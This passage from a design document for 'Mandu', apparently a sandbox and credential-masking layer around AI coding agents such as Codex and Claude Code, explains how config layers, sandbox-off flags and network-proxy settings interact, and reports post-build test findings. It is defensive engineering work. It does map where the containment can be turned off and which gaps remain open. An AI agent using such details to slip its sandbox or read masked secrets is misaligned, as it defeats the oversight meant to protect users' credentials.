filesystem restriction beyond Codex's built-in profiles lives there (an
allowlist of reads as much as a `"<path>" = "deny"` entry; the built-ins
cannot be edited, and they read everything); or the network proxy
feature, which wraps commands in Seatbelt even with full access, so it
wins even over the run's own "off", unless the run turns the proxy off
itself (`--disable network_proxy` anywhere, or `-c
features.network_proxy=false`, which Mandu carries into its override so
that Codex keeps it at the level it reads). Both are read conservatively
over every config layer Codex may apply (`codexConfigLayers`:
`/etc/codex/config.toml`, `$CODEX_HOME/config.toml`, the run's `-p`
profile, and the `.codex/config.toml` of every folder from `/` down to the
working directory and to the run's `-C` / `--cd` directory, trusted or
not, since `project_root_markers` may put the project root above the
nearest `.git` and Mandu's own launch may trust a project): any layer
counts, and a higher layer that turns them off does not cancel a lower one
(Codex may not apply it). Only the run's own "off" is quiet (`--yolo`,
`-s danger-full-access`, or a `-c` at the command level Codex reads:
`seatbelt-sandbox-off`, no line, the same override). A config or a `-p`
profile that turns it off gets the override and the launch line, after
the checks above (which layer Codex applies, an untrusted project's or one
above a profile, is not Mandu's to guess). Within one command level's
`-c` list `default_permissions` outranks `sandbox_mode` in any order (and
`--approve-for-me` sits between them); Codex reads only the innermost
level's list once Mandu gives every level one, so an outer `-c` that asks
for a sandbox still counts as the run asking, and one that turns it off
does not. `--remote`
wins over everything else the run asks for: the session's commands, and
the run's sandbox options, go to that app server, outside Mandu's profile,
so one WARNING says so and nothing is injected. A bare `codex app-server`
(an IDE's backend) is a session too: Mandu sets its default to
danger-full-access, and its line says that a client choosing a sandbox for
a thread overrides that default (that thread's commands then fail); with a
subcommand of its own (`daemon`, `proxy`, `generate-*`), even after its
options, it is not.
`codex sandbox` and `exec-server` keep a WARNING (their commands fail
inside the profile). The doctor knows the host, not the mode a launch
runs in, so its ✓ row says "in mode secrets" for the credential files.
Turning it off makes Codex record the project as trusted in its
`config.toml`. Every Mandu `-c` also keeps an interactive Codex off its
shared app-server daemon (any `-c` but a feature toggle does), so a daemon
started outside Mandu never runs its commands. Linux is unchanged: there
the agent's sandbox nests in Mandu's. The agent's own write and network
limits are not replaced on macOS: adding them to Mandu's profile is the gap
to close (the non-root principle). Tests:
`launcher/test/unit/claude-sandbox.test.ts`, `codex-sandbox.test.ts`,
`doctor.test.ts` and `launch-banner.test.ts` (darwin fixtures);
`launcher/test/component/agent-own-sandbox.test.ts` (through main() with
stand-in `codex` and `claude` binaries, inside Mandu's real profile on
macOS).

A user may turn on Claude Code's `/sandbox` under Mandu. Two facts to
design around, both checked at launch and by `mandu doctor`:

- **Two seccomp filters stack** (the kernel runs both). The interposer is
  installed by the launcher outside Claude Code's bubblewrap, so it sees the
  sandboxed command's opens too; Claude Code's optional unix-socket filter
  must not block the arbiter socket path (the launcher passes it through
  `sandbox.network.allowUnixSockets` when it writes the session settings,
  as it already does for the proxy ports).
- **Two masks on one file** is a double placeholder: Claude Code's sentinel
  copy over Mandu's structured twin. The launcher reads the effective
  `sandbox.credentials` list and, for any path Mandu already registers,
  warns once and names the setting to remove. Mandu's twin is the one to
  keep: it covers the LLM's own reads and the whole tree; theirs covers
  sandboxed Bash only.

### 12.4 Migration is a no-op

Existing `paths[]` entries keep their meaning (`level`, `bindings`,
`recursive`, patterns). A file that was a whole-file twin becomes a
structured twin on the next launch if its shape is known, and stays
whole-file otherwise; nothing a user wrote is reinterpreted. `readers` are
absent until an Inbox answer or a first-use pin writes them.

### 12.5 Modes

Everything here is the confidentiality axis: it applies in `secrets` and
`full`, is inert in `injection` and `off`, and in `full` the integrity
clause of §3.5 additionally refuses raw reads to untrusted-lineage
processes. The launch mode line carries the counts: `mandu: mode secrets
(14 credential files masked, 3 env vars masked, 2 readers pinned)`
(`registerSecret` reports each file's reader list shape, the launcher sums
the pins, and `modeLine` prints the env-var and pinned-reader counts only
when non-zero; `launch-banner.test.ts`).

## 13. Post-build findings (2026-09-24)

- **The production adapter masked every live Bash result.** The repeat
  battery showed most sessions with `[mandu:secret] masked: the process
  taint could not be read` on ordinary results (a `find`, an `ls`).
  Cause: `anthropic-proxy/src/arbiter-client.ts` forwarded `callTaint` as
  ONE object where the real client takes `(callId, opts)`, so the arbiter
  answered `Unknown named parameter 'callId'` and the proxy's fail-closed
  rule masked the result. Every e2e stayed green because the stacks
  wrapped the real client in a bridge that re-shaped the call, and the unit
  tests used the interface-level mock. Safe direction, invisible to the
  oracles. Fixed, and `tests/stack/proxy-real-client-parity.test.ts` now
  builds the PRODUCTION wiring (`new ArbiterClientAdapter(new
  ArbiterClient(sock))`, no bridge) over a real arbiter and calls each
  plan 10 op. This became a project rule (see
  [`CONTRIBUTING.md`](../../../CONTRIBUTING.md)): an arbiter-client adapter
  ships a parity test over the real client, because the mock proves the
  package and only the parity test proves the wiring.
- **Repeat battery** (S1–S6 on two models, twice): every security check
  held (24 of 24), no gate declined; the only failures were the adapter
  bug above.
- **Guard-only soak** (`MANDU_SECRET_BIND=0`, the twins served by
  descriptor alone): the six tasks held and every security check passed;
  the one timeout was the drill runner's submission race (§8 phase 4),
  wider under this posture because every startup `git` open of a labeled
  file is an arbiter round trip. The bind stays on by default (§8 phase 6).
- **S7 (deny) was silent at both ends**: the exec box's clean attempt
  consumed the human's once-deny, the rerun's hold expired with no arbiter
  record, and the program's "Permission denied" line was masked as a
  secret by the path-derived level. Closed in three places: the clean box
  never asks (§12.2), the ceiling is the arbiter's recorded denial
  (§12.2), and the `held:` note plus the denied-only release (§11.8).
  `secret-hold-timeout.test.ts` (e2e), `provenance-ipc.test.ts`,
  `rewrite-request.test.ts` and `secret_open::tests` pin it.
